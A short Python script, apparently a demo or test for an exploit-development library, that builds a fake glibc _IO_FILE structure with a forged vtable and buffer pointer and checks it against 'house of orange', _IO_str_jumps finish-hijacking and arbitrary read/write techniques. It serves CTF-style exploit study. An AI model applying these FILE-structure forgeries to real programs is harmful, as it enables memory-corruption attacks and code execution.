from IO_FILE_plus import *
import base64
context.arch='amd64'
fake_file=IO_FILE_plus()
fake_file._IO_write_ptr=1 # set _IO_write_ptr
fake_file._IO_write_base=0
#fake_file._write_ptr = 
fake_file.vtable = 0x7f5106e8f578
fake_file._IO_buf_base = 0x7f5106e56e66
print(dir(fake_file))

fake_file.show()   # show the IO FILE

fake_file.orange_check() # check if the IO FILE can attack `house of orange`

fake_file.str_finish_check() # check if the IO FILE can attack hajck the `_IO_finish` in `_IO_str_jumps` vtable

# fake_file.arbitrary_read_check("stdout") # check if the IO FILE can arbitrary read in stdout handle

# fake_file.arbitrary_write_check("stdin") # check if the IO FILE can arbitrary write in stdin handle

# fake_file.arbitrary_write_check("stdout") # check if the IO FILE can arbitrary write in stdout handle\
# test = ""

# print(dir(fake_file))
# print(fake_file.get_payload())
#print(fake_file.show())
#print (base64.b64encode(str(fake_file)))
#print(test)